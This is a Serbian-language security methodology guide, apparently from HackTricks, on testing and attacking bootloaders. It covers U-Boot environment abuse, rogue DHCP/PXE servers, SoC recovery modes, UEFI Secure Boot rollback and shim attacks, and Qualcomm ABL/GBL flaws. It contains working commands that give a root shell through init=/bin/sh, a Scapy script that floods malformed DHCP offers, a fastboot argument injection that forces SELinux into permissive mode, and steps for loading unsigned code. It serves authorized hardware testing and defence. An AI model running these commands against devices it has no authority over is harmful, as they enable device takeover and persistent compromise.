# Testiranje bootloader-a

{{#include ../../banners/hacktricks-training.md}}

Preporučuju se sledeći koraci za menjanje konfiguracija pokretanja uređaja i testiranje bootloader-a kao što su U-Boot i UEFI-class loaders. Fokusirajte se na dobijanje izvršavanja koda u ranoj fazi, procenu zaštite od potpisa i vraćanja na stariju verziju, kao i zloupotrebu recovery ili network-boot putanja.

Povezano: zaobilaženje MediaTek secure-boot-a pomoću bl2_ext patching-a:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Brzi dobici u U-Boot-u i zloupotreba okruženja

1. Pristupite interpreter shell-u
   - Tokom pokretanja pritisnite poznati taster za prekid (često bilo koji taster, 0, razmak ili sekvencu „magic“ specifičnu za ploču) pre izvršavanja `bootcmd` da biste otvorili U-Boot prompt.<sup>[[1]](#references)</sup>

2. Pregledajte stanje pokretanja i promenljive
   - Korisne komande:
     - `printenv` (prikaže okruženje)
     - `bdinfo` (informacije o ploči, memorijske adrese)
     - `help bootm; help booti; help bootz` (podržani načini pokretanja kernela)
     - `help ext4load; help fatload; help tftpboot` (dostupni učitavači)

3. Izmenite argumente pokretanja da biste dobili root shell
   - Dodajte `init=/bin/sh` kako bi se kernel otvorio u shell-u umesto da pokrene uobičajeni init:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot sa vašeg TFTP servera
   - Konfigurišite mrežu i preuzmite kernel/fit image sa LAN-a:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Sačuvajte promene putem okruženja
   - Ako env skladište nije zaštićeno od upisivanja, možete trajno zadržati kontrolu:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Proverite promenljive poput `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` koje utiču na rezervne putanje. Pogrešno konfigurisane vrednosti mogu omogućiti ponovljene ulaske u shell.

6. Proverite debug/nebezbedne funkcije
   - Potražite: `bootdelay` > 0, onemogućen `autoboot`, neograničen `usb start; fatload usb 0:1 ...`, mogućnost korišćenja `loady`/`loads` preko serijske veze, `env import` sa nepouzdanog medija i kernele/ramdisk-ove učitane bez provere potpisa.

7. Testiranje U-Boot slika/provere
   - Ako platforma tvrdi da koristi secure/verified boot sa FIT slikama, isprobajte i nepotpisane i izmenjene slike:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Odsustvo `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ili legacy ponašanje `verify=n` često omogućava pokretanje proizvoljnih payload-ova.
   - Nemojte se zaustaviti na jednostavnom rezultatu dozvoljeno/odbijeno: nedavna FIT istraživanja pokazala su da i sam put provere može biti pre-auth površina za napad. Testirajte negativne slučajeve za eksterno smeštene FIT podatke (`data-offset`, `data-position`, `data-size`), izbor potpisane konfiguracije, `loadables` i obradu overlay / `extra-conf` stavki.
   - Ako imate odgovarajuće izvorno stablo, `test/vboot/vboot_test.sh` je brz način da reprodukujete ponašanje FIT provere u U-Boot sandbox-u pre nego što pristupite stvarnom hardveru.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` i tokovi pokretanja skripti
   - U novijim U-Boot build-ovima, `bootcmd` je često samo omotač oko Standard Boot-a. To znači da mediji na koje može da se upisuje, PXE ili SPI flash mogu postati stvarna granica poverenja, čak i kada vidljivo okruženje deluje bezazleno.
   - `extlinux` bootmeth pretražuje `extlinux/extlinux.conf` u `/` i `/boot`; script bootmeth prvo traži `boot.scr.uimg`, a zatim `boot.scr`. Pri mrežnom pokretanju, ime skripte može da se preuzme iz `boot_script_dhcp`.
   - Korisne komande za početnu analizu:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Slučajevi zloupotrebe za testiranje: mediji USB/SD pod kontrolom napadača koji se nalaze ranije u `boot_targets`, upisiv `/boot/extlinux/extlinux.conf`, lažni TFTP server koji isporučuje `boot.scr` ili izvršavanje skripte preko SPI-ja putem `script_offset_f`.
   - Ako se platforma oslanja na FIT verifikaciju, uverite se da su konfiguracije potpisane na nivou konfiguracije, a ne samo po slici; `required-mode=all` je stroži od prihvatanja bilo kog pojedinačnog obaveznog ključa.

## Površina mrežnog pokretanja (DHCP/PXE) i lažni serveri

9. Fuzzing DHCP/PXE parametara
   - U-Boot-ovo nasleđeno BOOTP/DHCP rukovanje imalo je probleme sa bezbednošću memorije. Na primer, CVE‑2024‑42040 opisuje otkrivanje memorije putem posebno oblikovanih DHCP odgovora, koji mogu da procure bajtove iz U-Boot memorije nazad preko mreže.<sup>[[4]](#references)</sup> Testirajte putanje koda DHCP/PXE pomoću predugačkih vrednosti i vrednosti na granicama (naziv boot fajla opcije 67, opcije dobavljača, polja file/servername) i pratite da li dolazi do blokiranja ili curenja podataka.
   - Minimalni Scapy isečak za stres-testiranje parametara pokretanja tokom mrežnog pokretanja:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Takođe proverite da li se polja za PXE filename prosleđuju shell/loader logici bez sanitizacije kada su povezana sa skriptama za provisioning na strani OS-a.

10. Testiranje command injection-a na lažnom DHCP serveru
   - Podesite lažni DHCP/PXE servis i pokušajte da ubacite znakove u polja filename ili options kako biste došli do interpretera komandi u kasnijim fazama lanca pokretanja. Metasploit-ov DHCP auxiliary, `dnsmasq` ili prilagođene Scapy skripte dobro rade. Pre toga izolujte laboratorijsku mrežu.

## Režimi oporavka SoC ROM-a koji nadjačavaju normalno pokretanje

Mnogi SoC-ovi imaju BootROM „loader“ režim koji prihvata kod preko USB/UART-a čak i kada su flash slike neispravne. Ako secure-boot fuse-ovi nisu pregoreli, ovo može omogućiti proizvoljno izvršavanje koda u veoma ranoj fazi lanca pokretanja.

- NXP i.MX (Serial Download Mode)
  - Alati: `uuu` (mfgtools3) ili `imx-usb-loader`.
  - Primer: `imx-usb-loader u-boot.imx` za slanje i pokretanje prilagođenog U-Boot-a iz RAM-a.
- Allwinner (FEL)
  - Alat: `sunxi-fel`.
  - Primer: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ili `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Alat: `rkdeveloptool`.
  - Primer: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` za učitavanje loader-a, a zatim slanje prilagođenog U-Boot-a.

Procenite da li su secure-boot eFuse/OTP bitovi uređaja upisani. Ako nisu, režimi preuzimanja BootROM-a često zaobilaze svaku verifikaciju višeg nivoa (U-Boot, kernel, rootfs) tako što direktno izvršavaju vaš payload prve faze iz SRAM/DRAM-a.

## UEFI/PC-klasa bootloader-a: brze provere

11. Testiranje ESP tampering-a, rollback-a i upisa ključeva
   - Montirajte EFI System Partition (ESP) i proverite da li sadrži komponente loader-a: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` i putanje do logotipa proizvođača.
   - Kada je moguće, iz OS-a izvezite stanje Secure Boot-a i baze podataka ključeva:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Ako je platforma u režimu Setup Mode, prihvata upis ključeva bez autentifikacije ili se isporučuje sa testnim/podrazumevanim Platform Key-om (klasa PKfail), lokalni administrator ili napadač sa fizičkim pristupom može da upiše sopstvene KEK/db ključeve i da Secure Boot i dalje izgleda „omogućeno“, dok se pokreću proizvoljni EFI binarni fajlovi.<sup>[[3]](#references)</sup>
   - Pokušajte da pokrenete sistem pomoću potpisanih komponenti za pokretanje na koje je vraćena starija verzija ili za koje se zna da su ranjive, ako opozivi za Secure Boot (dbx) nisu ažurni. Ako platforma i dalje veruje starim shim-ovima/bootmanager-ima, često možete da učitate sopstveni kernel ili `grub.cfg` sa ESP-a i ostvarite postojanost.
   - U Windows-u, zakrpljeni hostovi i dalje mogu da prihvate ranjive potpisane boot manager-e ako potpisnik `Microsoft Windows Production PCA 2011` nije prisutan u firmware `dbx`, kao što je zabeleženo u slučaju BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Zaobilaženje u stilu Baton Drop može da upiše napadačev MOK; legitimni shim zatim može da učita EFI payload potpisan tim ključem pri narednim pokretanjima.<sup>[[12]](#references)[[13]](#references)</sup> Kasnije opozivanje starog Windows potpisnika ne uklanja upisani MOK, pa putanja zasnovana na shim-u može da ostane postojana ako se tom shim-u i dalje veruje.<sup>[[12]](#references)</sup>
   - Pre testiranja ove putanje vraćanja na stariju verziju na ovlašćenoj UEFI mašini, proverite **efektivno stanje opoziva u firmveru**, a ne samo istoriju Windows ažuriranja.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft nudi ovu PowerShell proveru sa povišenim privilegijama, koja ne menja podatke, za potpisnika iz 2011. u `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` je samo naznaka: u laboratoriji koja se može oporaviti potvrdite konkretnu potpisanu komponentu za pokretanje i druge opozive.<sup>[[12]](#references)[[14]](#references)</sup> Ažuriranje registra koje je na čekanju ili istekli sertifikat za potpisivanje nisu isto što i dovršen opoziv u `dbx`-u.<sup>[[13]](#references)[[14]](#references)</sup>

12. Testiranje zastarelih opoziva shim / SBAT / dbx
   - Stari shim-ovi potpisani Microsoftovim sertifikatom i fork-ovi dobavljača i dalje mogu poslužiti kao putanja za bootkit u stilu BYOVD-a ako su opozivi zastareli. U izolovanoj laboratoriji postavite istorijski ranjiv shim na ESP i pokušajte da lančano učitate sopstveni `grubx64.efi` ili kernel.<sup>[[11]](#references)</sup>
   - Brza trijaža:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Ako shim i dalje radi uprkos tome što se nalazi na listi opoziva, firmware/OS ima zastarele `dbx` ispravke ili veruje forkovanom loader-u koji nikada nije nasledio upstream SBAT zaštite.

13. Greške u parsiranju logotipa pri pokretanju (klasa LogoFAIL)
   - Nekoliko OEM/IBV firmware-a bilo je ranjivo na greške u parsiranju slika u DXE-u, koji obrađuje logotipe pri pokretanju. Ako napadač može da postavi posebno napravljenu sliku na ESP, na putanju specifičnu za proizvođača (npr. `\EFI\<vendor>\logo\*.bmp`), pa ponovo pokrene uređaj, moguće je izvršavanje koda tokom ranog pokretanja sistema, čak i kada je Secure Boot omogućen. Proverite da li platforma prihvata logotipe koje dostavlja korisnik i da li su te putanje upisive iz OS-a.<sup>[[2]](#references)</sup>


## Nedostaci u poverenju kod Android/Qualcomm ABL + GBL (Android 16)

Na uređajima sa Android 16 koji koriste Qualcomm ABL za učitavanje **Generic Bootloader Library (GBL)**, proverite da li ABL **autentifikuje** UEFI aplikaciju koju učitava sa particije `efisp`. Ako ABL proverava samo **prisustvo** UEFI aplikacije, a ne verifikuje potpise, primitivan način upisa na `efisp` omogućava **izvršavanje nepotpisanog koda pre OS-a** pri pokretanju.<sup>[[6]](#references)[[7]](#references)</sup>

Praktične provere i načini zloupotrebe:

- **Primitivan način upisa na efisp**: Potreban vam je način da upišete prilagođenu UEFI aplikaciju na `efisp` (root/priviligovana usluga, greška u OEM aplikaciji, recovery/fastboot putanja). Bez toga, nedostatak u učitavanju GBL-a nije direktno dostupan za zloupotrebu.<sup>[[6]](#references)</sup>
- **Ubrizgavanje OEM argumenata fastboot-а** (greška u ABL-у): Неке верзије прихватају додатне токене у `fastboot oem set-gpu-preemption` и додају их у командну линију kernel-а. Ово се може искористити за принудно постављање SELinux-а у permissive режим, чиме се омогућава упис на заштићене партиције:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Ako je uređaj zakrpljen, komanda treba da odbije dodatne argumente.<sup>[[5]](#references)[[6]](#references)</sup>
- **Otključavanje bootloader-a putem trajnih zastavica**: Payload u fazi pokretanja može da promeni trajne zastavice za otključavanje (npr. `is_unlocked=1`, `is_unlocked_critical=1`) i tako emulira `fastboot oem unlock` bez provera OEM servera/odobrenja. Ovo je trajna promena stanja nakon sledećeg ponovnog pokretanja.<sup>[[6]](#references)</sup>

Napomene za odbranu/trijažu:

- Proverite da li ABL obavlja proveru potpisa GBL/UEFI payload-a iz `efisp`. Ako ne, tretirajte `efisp` kao površinu visokog rizika za persistence.
- Pratite da li su ABL fastboot OEM handler-i zakrpljeni tako da **proveravaju broj argumenata** i odbacuju dodatne tokene.<sup>[[8]](#references)[[9]](#references)</sup>

## Upozorenje za hardver

Budite oprezni pri radu sa SPI/NAND flash memorijom tokom ranog pokretanja (npr. uzemljivanju pinova radi zaobilaženja čitanja) i uvek konsultujte datasheet flash memorije. Kratki spojevi u pogrešnom trenutku mogu da oštete uređaj ili programator.

## Napomene i dodatni saveti

- Isprobajte `env export -t ${loadaddr}` i `env import -t ${loadaddr}` za premeštanje env blob-ova između RAM-a i skladišta; neke platforme dozvoljavaju uvoz env-a sa prenosivih medija bez autentifikacije.
- Za persistence na sistemima zasnovanim na Linux-u koji se pokreću preko `extlinux.conf`, često je dovoljno izmeniti liniju `APPEND` (ubacivanjem `init=/bin/sh` ili `rd.break`) na particiji za pokretanje, ako se ne sprovode provere potpisa.
- Ako cilj koristi ažuriranja sa dva slota / A/B, pregledajte tehnike za zaobilaženje anti-rollback zaštite i desinhronizaciju slotova u [pregledu analize firmware-a](README.md) da ne biste propustili propuste u poverenju koji postoje samo u updater-u, izvan samog bootloader-a.
- Ako userland pruža `fw_printenv/fw_setenv`, proverite da li se `/etc/fw_env.config` podudara sa stvarnim env skladištem. Pogrešno podešeni pomaci omogućavaju čitanje/pisanje pogrešne MTD oblasti.

## References

- [1] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Otkrivanje LogoFAIL-a: opasnosti obrade slika tokom pokretanja sistema](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Nepouzdani ključevi platforme podrivaju Secure Boot u UEFI ekosistemu](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Detalji o CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Otključavanje Xiaomi uređaja pomoću dva nesanitizovana stringa](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit omogućava napadačima da otključaju bootloader-e](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Arhitektura Generic Bootloader-a (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Ispravka prosleđivanja nepouzdanog ulaza u kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: dodavanje provere za komandu set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Nije moguće pokrenuti: zaobilaženje U-Boot-ove FIT provere potpisa](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Napomena o ranjivosti VU#616257 - Microsoft-potpisani UEFI shim bootloader-i ranjivi su na zaobilaženje Secure Boot-a](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus UEFI bootkit: mit potvrđen](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: UEFI bootkit nalik na BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Kako upravljati opozivima Windows Boot Manager-a za promene u Secure Boot-u](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
